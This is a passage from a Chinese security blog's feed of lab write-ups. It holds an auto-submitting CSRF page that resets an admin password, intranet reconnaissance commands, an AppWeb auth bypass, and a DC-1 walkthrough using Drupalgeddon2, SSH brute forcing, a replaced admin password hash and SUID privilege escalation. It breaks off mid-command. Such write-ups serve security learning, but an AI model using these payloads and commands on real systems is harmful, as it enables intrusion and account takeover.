xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;);        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart\/form-data; boundary=---------------------------36130568313950689285470620618&quot;);        xhr.withCredentials = true;        var body = &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;user\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;admin\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;admin\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;12345\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;password2\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;12345\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;mail\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;me@isea.so\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;qq\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;86226999\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;images\&quot;; filename=\&quot;\&quot;\r\n&quot; +           &quot;Content-Type: application/octet-stream\r\n&quot; +           &quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;save\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;1\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618--\r\n&quot;;        var aBody = new Uint8Array(body.length);        for (var i = 0; i &lt; aBody.length; i++)          aBody[i] = body.charCodeAt(i);         xhr.send(new Blob([aBody]));      }    &lt;/script&gt;    &lt;form action=&quot;#&quot;&gt;      &lt;input id=&quot;lnng&quot; type=&quot;Submit&quot; value=&quot;Submit&quot; onclick=&quot;submitRequest();&quot; /&gt;    &lt;/form&gt;      &lt;script type=&quot;text/javascript&quot;&gt;                          // js自动点击      var lnng = document.getElementById(&quot;lnng&quot;);      lnng.click();  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>设置js自动点击，在设置之前的存储xss跳转到csrf页面<br>成功修改密码</p><p>后台中还有很多比如删除文章等地方同样存在csrf，同样原理</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>第一次代码审计选了个简单的cms，不涉及框架很适合我这种小白，体验还不错(其实看了蛮久的，唉)</p><p>如有错误请大佬指点，感谢</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>evils大佬:<a href="https://evi1s.com/archives/124/" target="_blank" rel="noopener">https://evi1s.com/archives/124/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码下载&quot;&gt;&lt;a href=&quot;#源码下载&quot; class=&quot;headerlink&quot; title=&quot;源码下载&quot;&gt;&lt;/a&gt;源码下载&lt;/h3&gt;&lt;p&gt;站长下载:&lt;a href=&quot;http://down.chinaz.com/soft/36930.htm&quot; target=&quot;_
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://lnng.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://lnng.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集学习笔记</title>
    <link href="https://lnng.top/posts/4b57.html"/>
    <id>https://lnng.top/posts/4b57.html</id>
    <published>2021-02-07T13:27:00.000Z</published>
    <updated>2021-05-05T10:42:04.323Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要是学习《内网安全攻防 渗透测试实战指南》的阅读笔记防止遗忘也是总结吧</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><img src="/images/pasted-324.png" alt="upload successful"></p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><h4 id="利用NetBIOS"><a href="#利用NetBIOS" class="headerlink" title="利用NetBIOS"></a>利用NetBIOS</h4><p>NetBIOS是局域网程序使用的一种应用程序编程接口，为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。系统可以利用wins服务，广播及Lmhost文件等多种模式将NetBLOS名—特指基于netbios协议获得计算机名—-解析为相应ip地址，实现信息通讯<br>netblos的使用上传</p><pre><code>nbt.exe,nbt.exe -m 192.168.124.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Lmg66/picture@main/image/1613291385331-1613291385330.png" alt="upload successful"></p><pre><code>./nbtscan -m 192.168.124.0/24</code></pre><p><img src="/images/pasted-325.png" alt="upload successful"><br><img src="/images/pasted-326.png" alt="upload successful"></p><h4 id="利用icmp协议快速探测内网"><a href="#利用icmp协议快速探测内网" class="headerlink" title="利用icmp协议快速探测内网"></a>利用icmp协议快速探测内网</h4><p>依次对内网的每个ip地址指向ping命令，可快速找到内网中所有存活的主机</p><pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.124.%I | findstr &quot;TTL=&quot;</code></pre><p><img src="/images/pasted-327.png" alt="upload successful"></p><h5 id="vbs脚本，执行注意修改ip段"><a href="#vbs脚本，执行注意修改ip段" class="headerlink" title="vbs脚本，执行注意修改ip段"></a>vbs脚本，执行注意修改ip段</h5><pre><code>cscript xxx.vbsstrSubNet = &quot;192.168.0.&quot;Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;)Set objTS = objfso.CreateTextFile(&quot;C:\Windows\Temp\Results.txt&quot;)For i = 1 To 254strComputer = strSubNet &amp; iblnResult = Ping(strComputer)If blnResult = True ThenobjTS.WriteLine strComputerEnd IfNextobjTS.CloseWScript.Echo &quot;All Done !&quot;Function Ping(strComputer)Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;)Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#39;&quot; &amp; strComputer &amp; &quot;&#39;&quot;)For Each objItem In colItemsSelect case objItem.StatusCodeCase 0Ping = TrueCase ElsePing = FalseEnd selectExit ForNextEnd Function</code></pre><h4 id="通过arp探测内网"><a href="#通过arp探测内网" class="headerlink" title="通过arp探测内网"></a>通过arp探测内网</h4><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><pre><code>arp.exe -t 192.168.124.0/24</code></pre><p><img src="/images/pasted-328.png" alt="upload successful"></p><h5 id="linux-需要root权限"><a href="#linux-需要root权限" class="headerlink" title="linux(需要root权限)"></a>linux(需要root权限)</h5><pre><code>apt-get install arp-scanarp-scan --localnet</code></pre><p><img src="/images/pasted-329.png" alt="upload successful"></p><h4 id="通过UDP发现内网存活主机"><a href="#通过UDP发现内网存活主机" class="headerlink" title="通过UDP发现内网存活主机"></a>通过UDP发现内网存活主机</h4><h5 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h5><pre><code>nmap -sU -T5 -sV --max-retries 1 192.168.124.129 -p 500</code></pre><pre><code>--max-retries &lt; tries &gt;： 扫描探针重发的端口盖数 </code></pre><p><img src="/images/pasted-330.png" alt="upload successful"></p><h5 id="2-msf"><a href="#2-msf" class="headerlink" title="2.msf"></a>2.msf</h5><pre><code>use auxiliary/scanner/discovery/udp_probe</code></pre><p><img src="/images/pasted-331.png" alt="upload successful"></p><pre><code>use auxiliary/scanner/discovery/udp_sweep</code></pre><p><img src="/images/pasted-332.png" alt="upload successful"></p><h5 id="3-unicornscan扫描"><a href="#3-unicornscan扫描" class="headerlink" title="3.unicornscan扫描"></a>3.unicornscan扫描</h5><pre><code>unicornscan -mU 192.168.124.129</code></pre><p><img src="/images/pasted-333.png" alt="upload successful"></p><h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><p>msf</p><pre><code>use auxiliary/scanner/portscan/tcp</code></pre><p><img src="/images/pasted-334.png" alt="upload successful"></p><p><img src="/images/pasted-335.png" alt="upload successful"></p><p><img src="/images/pasted-336.png" alt="upload successful"></p><p><img src="/images/pasted-337.png" alt="upload successful"></p><h3 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h3><p><img src="/images/pasted-338.png" alt="upload successful"></p><h3 id="获取域内的用户和管理员信息"><a href="#获取域内的用户和管理员信息" class="headerlink" title="获取域内的用户和管理员信息"></a>获取域内的用户和管理员信息</h3><p><img src="/images/pasted-339.png" alt="upload successful"></p><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>在一个域中，当计算机加入域后，会默认给域管理员赋予本地系统管理员权限。因此，域管理员均可以访问本地计算机，且具备完全控制权限。</p><p>定位域内管理员的两种渠道：日志和会话。</p><p>日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。</p><p>会话是指域内每台机器的登陆会话，可以使用netsess.exe或PowerView等工具查询（可以匿名查询，不需要权限）。</p><h4 id="PsLoggedon-exe"><a href="#PsLoggedon-exe" class="headerlink" title="PsLoggedon.exe"></a>PsLoggedon.exe</h4><p>通过检验注册表里HKEY_USERS的key值来查询谁登陆过机器，同样也调用到了NetSessionEnum API。</p><p>PS：该工具的某些功能需要管理员权限</p><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><p>参数     描述</p><pre><code>-     显示支持的选项和用于输出值的度量单位-l     仅显示本地登录，而不显示本地和网络资源登录-x     不显示登录时间\computername     指定要为其列出登录信息的计算机的名称username     指定用户名，在网络中搜索该用户登陆的计算机</code></pre><p><img src="/images/pasted-340.png" alt="upload successful"></p><h4 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser.exe"></a>PVEFindADUser.exe</h4><p>用于查找Active Directory用户的登录位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。</p><p>运行该工具需要配置 .NET Framework 2.0 环境，并且需要具有管理员权限。</p><p>下载地址：<a href="https://github.com/chrisdee/Tools/raw/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/raw/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe</a></p><p>.NET Framework 2.0环境下载地址(根据自己的环境下载)：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=1639" target="_blank" rel="noopener">https://www.microsoft.com/zh-CN/download/details.aspx?id=1639</a></p><p><img src="/images/pasted-341.png" alt="upload successful"></p><pre><code>参数     描述-h     显示帮助信息-u     检测程序是否有新版本-current [&quot;username&quot;]     -current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping     阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target     此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;本文主要是学习《内网安全攻防 渗透测试实战指南》的阅读笔记防止遗忘也是总结吧&lt;/p&gt;
&lt;h3 id=&quot;基本命令&quot;&gt;&lt;a href=&quot;#基本命
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://lnng.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://lnng.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网域基础学习笔记</title>
    <link href="https://lnng.top/posts/95a7.html"/>
    <id>https://lnng.top/posts/95a7.html</id>
    <published>2021-02-06T12:39:00.000Z</published>
    <updated>2021-02-09T15:29:04.287Z</updated>
    
    <content type="html"><![CDATA[<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>为了方便区分不同的计算机的功能，划分了不同的组(没有服务器和客户机之分),右键”我的电脑”-&gt;”属性”-&gt;”更改”，里面有工作组的设置</p><p><img src="/images/pasted-303.png" alt="upload successful"><br>查看工作组和工作共享，”控制面板”-&gt;”选择家庭组和共享选项”-&gt;”创建家庭组”，即可共享资源<br><img src="/images/pasted-305.png" alt="upload successful"></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域是一个有边界的计算机集合(不同的域无法相互访问，除外建立信任关系)，<br>域与工作组相比，域的安全管理更加严格，用户在域内的权限取决于域内的身份。</p><h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h4><p>域控制器好比门禁系统，负责验证用户身份，如是否属于这个域，登录账号是否存在，密码是否正确，储存账号信息的数据库，负责验证所有权限用户</p><p>单域一般要两台域服务器，一台作为DC，令一台做备用DC(为了防止瘫痪数据的备份)</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>在网络中划分多个域，第一域称为父域，各分部的域称为该域的子域，同一域内，信息交互的条目多，且不会压缩，不同域之间，信息的交互条目相对较少，而且，可以压缩，且每个域都有自己的安全策略</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树是多个域通过建立信任关系组成的集合<br><img src="/images/pasted-306.png" alt="upload successful"></p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>多个域树建立信任关系组成的集合。<br><img src="/images/pasted-307.png" alt="upload successful"><br>域名服务器<br>实现域名与ip地址转换的服务器，DNS服务器和域控制器通常配置在同一台机器上<br>活动目录<br>用于存储有关网络对象(例如用户，组，计算机，共享资源，打印机和联系人等)的信息。安装活动目录数据的计算机就是DC                                                                               </p><h4 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h4><p>实现域名与ip地址转换的服务器，DNS服务器和域控制器通常配置在同一台机器上</p><p>活动目录</p><p>用于存储有关网络对象(例如用户，组，计算机，共享资源，打印机和联系人等)的信息。安装活动目录数据的计算机就是DC</p><h3 id="windows-server-2003搭建域控制器"><a href="#windows-server-2003搭建域控制器" class="headerlink" title="windows_server_2003搭建域控制器"></a>windows_server_2003搭建域控制器</h3><h4 id="设置ip，子网掩码，dns指向本地ip"><a href="#设置ip，子网掩码，dns指向本地ip" class="headerlink" title="设置ip，子网掩码，dns指向本地ip"></a>设置ip，子网掩码，dns指向本地ip</h4><p><img src="/images/pasted-310.png" alt="upload successful"></p><h4 id="更改计算机名"><a href="#更改计算机名" class="headerlink" title="更改计算机名"></a>更改计算机名</h4><p><img src="/images/pasted-311.png" alt="upload successful"><br>需要重启计算机</p><h4 id="安装域控制器和DNS服务"><a href="#安装域控制器和DNS服务" class="headerlink" title="安装域控制器和DNS服务"></a>安装域控制器和DNS服务</h4><p><img src="/images/pasted-312.png" alt="upload successful"></p><p><img src="/images/pasted-313.png" alt="upload successful"><br>然后一路默认就行</p><p>新建立用户<br><img src="/images/pasted-314.png" alt="upload successful"></p><p><img src="/images/pasted-315.png" alt="upload successful"></p><h4 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h4><p>加入的人设置dns设置为域设置时候的dns服务器<br><img src="/images/pasted-316.png" alt="upload successful"></p><p><img src="/images/pasted-317.png" alt="upload successful"></p><p><img src="/images/pasted-318.png" alt="upload successful"></p><p>如果加入的时候提示拒绝应该是非正常脱离域</p><p>到这里将其删除重写连接就行了</p><p><img src="/images/pasted-319.png" alt="upload successful"></p><h5 id="登录到域"><a href="#登录到域" class="headerlink" title="登录到域"></a>登录到域</h5><p><img src="/images/pasted-322.png" alt="upload successful"><br>向域发送一个请求测试一下</p><pre><code>net user /domain</code></pre><p><img src="/images/pasted-323.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;工作组&quot;&gt;&lt;a href=&quot;#工作组&quot; class=&quot;headerlink&quot; title=&quot;工作组&quot;&gt;&lt;/a&gt;工作组&lt;/h3&gt;&lt;p&gt;为了方便区分不同的计算机的功能，划分了不同的组(没有服务器和客户机之分),右键”我的电脑”-&amp;gt;”属性”-&amp;gt;”更改”，里面
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://lnng.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="学习笔记" scheme="https://lnng.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vulhub</title>
    <link href="https://lnng.top/posts/68bd.html"/>
    <id>https://lnng.top/posts/68bd.html</id>
    <published>2020-12-20T13:33:00.000Z</published>
    <updated>2021-05-05T10:43:44.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h2><p>靶场地址:<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><p>靶场是基于docker搭建的，用起来真心舒服，强烈推荐，搭建方便而且还有题解，下面就是一些自己的复现，没啥东西就是cv的，就是简单记录一下学习</p><h2 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h2><p>docker启动，打开页面是一个登录框<br><img src="/images/pasted-300.png" alt="upload successful"></p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><pre><code>basic 传统HTTP基础认证digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头form 表单认证</code></pre><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。<br>详细原理:<a href="https://www.freebuf.com/column/221660.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221660.html</a><br>抓包删掉如图，在发送，发现登录成功<br><img src="/images/pasted-301.png" alt="upload successful"><br><img src="/images/pasted-302.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;靶场说明&quot;&gt;&lt;a href=&quot;#靶场说明&quot; class=&quot;headerlink&quot; title=&quot;靶场说明&quot;&gt;&lt;/a&gt;靶场说明&lt;/h2&gt;&lt;p&gt;靶场地址:&lt;a href=&quot;https://github.com/vulhub/vulhub&quot; target=&quot;_blank
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DC靶机1-9合集</title>
    <link href="https://lnng.top/posts/2ea3.html"/>
    <id>https://lnng.top/posts/2ea3.html</id>
    <published>2020-11-25T11:32:00.000Z</published>
    <updated>2020-11-25T11:44:42.921Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h3 id="文章前提概述"><a href="#文章前提概述" class="headerlink" title="文章前提概述"></a>文章前提概述</h3><p>本文介绍DC-1靶机的渗透测试流程<br>涉及知识点(比较基础):<br>nmap扫描网段端口服务<br>msf的漏洞搜索<br>drupal7的命令执行利用<br>netcat反向shell<br>mysql的基本操作<br>sudi提权</p><h3 id="基本环境搭建"><a href="#基本环境搭建" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h3><p>靶机下载地址:<a href="http://www.five86.com/downloads/DC-1.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-1.zip</a><br><a href="https://download.vulnhub.com/dc/DC-1.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-1.zip</a><br>VMware（windows）:<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br>选择高版本的vmware，不然可能不支持ova导入<br>下载导入开机vmware设置选择nat模式，目的让你的攻击机和靶机在一个网段，可以根据网络环境自行设置只要在一个网段就行。</p><h3 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h3><h4 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h4><pre><code>nmap -A 192.168.124.0/24</code></pre><p>扫描结果<br>开发80，111，22ssh端口</p><pre><code>Host is up (0.00039s latency).Not shown: 997 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp  open  http    Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37454/udp   status|   100024  1          39208/udp6  status|   100024  1          52048/tcp   status|_  100024  1          57763/tcp6  statusMAC Address: 00:0C:29:A6:59:A3 (VMware)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.39 ms 192.168.124.145</code></pre><h4 id="先爆破一下ssh吧-无结果"><a href="#先爆破一下ssh吧-无结果" class="headerlink" title="先爆破一下ssh吧(无结果)"></a>先爆破一下ssh吧(无结果)</h4><pre><code>nmap --script=ssh-brute 192.168.124.145</code></pre><p><img src="/images/pasted-107.png" alt="upload successful"></p><h4 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h4><p><img src="/images/pasted-108.png" alt="upload successful"><br>尝试了注册，登录的弱密码，修改密码，无效，但发现admin用户存在<br>wappalyzer指纹识别，发现室Drupal系统<br><img src="/images/pasted-109.png" alt="upload successful"></p><h3 id="去漏洞库和msf搜索一下"><a href="#去漏洞库和msf搜索一下" class="headerlink" title="去漏洞库和msf搜索一下"></a>去漏洞库和msf搜索一下</h3><pre><code>msfconsolesearch Drupal</code></pre><p><img src="/images/pasted-110.png" alt="upload successful"></p><p><img src="/images/pasted-111.png" alt="upload successful"><br>发现有漏洞可以用那就开始msf吧<br>使用2018年的漏洞吧，是个远程代码执行(代码审计现在真心看不懂，😔)<br><a href="https://www.exploit-db.com/exploits/44482" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a><br><img src="/images/pasted-112.png" alt="upload successful"></p><h4 id="msf发现连接成功"><a href="#msf发现连接成功" class="headerlink" title="msf发现连接成功"></a>msf发现连接成功</h4><pre><code>use exploit/unix/webapp/drupal_drupalgeddon2set RHOSTS 192.168.124.145run</code></pre><p><img src="/images/pasted-113.png" alt="upload successful"></p><h3 id="寻找一下flag"><a href="#寻找一下flag" class="headerlink" title="寻找一下flag"></a>寻找一下flag</h3><pre><code>shellfind / -name flag*</code></pre><p><img src="/images/pasted-114.png" alt="upload successful"></p><pre><code>/home/flag4/home/flag4/flag4.txt/var/www/flag1.txt</code></pre><p>打开flag1.txt试试</p><pre><code>cat /var/www/flag1.txt</code></pre><p><img src="/images/pasted-115.png" alt="upload successful"><br>翻译一下:每一个好的CMS都需要一个配置文件–你也一样。<br>搜索Drupal的配置文件<br>/var/www/sites/default/settings.php，打开</p><pre><code>cat /var/www/sites/default/settings.php</code></pre><pre><code>* * flag2 * Brute force and dictionary attacks aren&#39;t the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */$databases = array (  &#39;default&#39; =&gt;   array (    &#39;default&#39; =&gt;     array (      &#39;database&#39; =&gt; &#39;drupaldb&#39;,      &#39;username&#39; =&gt; &#39;dbuser&#39;,      &#39;password&#39; =&gt; &#39;R0ck3t&#39;,      &#39;host&#39; =&gt; &#39;localhost&#39;,      &#39;port&#39; =&gt; &#39;&#39;,      &#39;driver&#39; =&gt; &#39;mysql&#39;,      &#39;prefix&#39; =&gt; &#39;&#39;,    ),  ),);</code></pre><h3 id="发现了flag2和数据库的账号密码，尝试连接一下"><a href="#发现了flag2和数据库的账号密码，尝试连接一下" class="headerlink" title="发现了flag2和数据库的账号密码，尝试连接一下"></a>发现了flag2和数据库的账号密码，尝试连接一下</h3><p>先弄一下交互shell吧</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-117.png" alt="upload successful"><br>连接数据库尝试一下</p><pre><code>mysql -u dbuser -p R0ck3t</code></pre><h3 id="查看一下node和user表，发现flag3"><a href="#查看一下node和user表，发现flag3" class="headerlink" title="查看一下node和user表，发现flag3"></a>查看一下node和user表，发现flag3</h3><pre><code>select * from node;select * from users;</code></pre><p><img src="/images/pasted-118.png" alt="upload successful"><br>为什么要看node表呢？？？(user表就不说了吧)<br>因为drupal node机制<br><a href="https://www.cnblogs.com/amw863/p/4551889.html" target="_blank" rel="noopener">drupal node机制理解</a><br>so，尝试获得登录的密码，hash值破解可能不太现实<br>我们注册一个账号将二者hash互换不就可以了<br>我丢不行，注册没法写密码，<br>那找到加密脚本自己加密一个不就行了<br>加密脚本位置</p><p>scripts/password-hash.sh<br><img src="/images/pasted-119.png" alt="upload successful"></p><pre><code>php scripts/password-hash.sh adminpassword: admin                 hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</code></pre><p>尝试更换管理员密码的hash</p><pre><code>update users set pass=&#39;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#39; where name=&#39;admin&#39;;</code></pre><p><img src="/images/pasted-120.png" alt="upload successful"><br>下面登录测试一下,账号admin密码admin<br><img src="/images/pasted-121.png" alt="upload successful"><br>在content中发现<br><img src="/images/pasted-122.png" alt="upload successful"><br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><h3 id="也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看"><a href="#也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看" class="headerlink" title="也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看"></a>也就是说我们需要寻找密码，而且提示shadow，之前的flag4还没看</h3><p><img src="/images/pasted-123.png" alt="upload successful"><br>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps it’s not that easy.  Or maybe it is?<br>应该是让获得管理员权限，再去/etc/shadow看看</p><p><img src="/images/pasted-124.png" alt="upload successful"><br>尝试给权限，还是不行<br><img src="/images/pasted-125.png" alt="upload successful"><br>那只能尝试提权了</p><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>SUID是set uid的简称，它出现在文件所属主权限的执行位上面，标志为 s 。当设置了SUID后，UMSK第一位为4。我们知道，我们账户的密码文件存放在/etc/shadow中，而/etc/shadow的权限为 ———-。也就是说：只有root用户可以对该目录进行操作，而其他用户连查看的权限都没有。当普通用户要修改自己的密码的时候，可以使用passwd这个指令。passwd这个指令在/bin/passwd下，当我们执行这个命令后，就可以修改/etc/shadow下的密码了。那么为什么我们可以通过passwd这个指令去修改一个我们没有权限的文件呢？这里就用到了suid，suid的作用是让执行该命令的用户以该命令拥有者即root的权限去执行，意思是当普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件了。<br>参考文章:<a href="https://blog.csdn.net/qq_36119192/article/details/82228791#Umask%E3%80%81Suid%E3%80%81Sgid%E3%80%81%E7%B2%98%E6%BB%9E%E4%BD%8D" target="_blank" rel="noopener">Linux下的用户、组和权限</a><br>已知的可用来提权的linux可行性的文件列表如下：<br>nmap,vim,find,bash,more,less,nano,cp<br>发现系统上运行的所有SUID可执行文件</p><pre><code>不同系统适用于不同的命令find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm 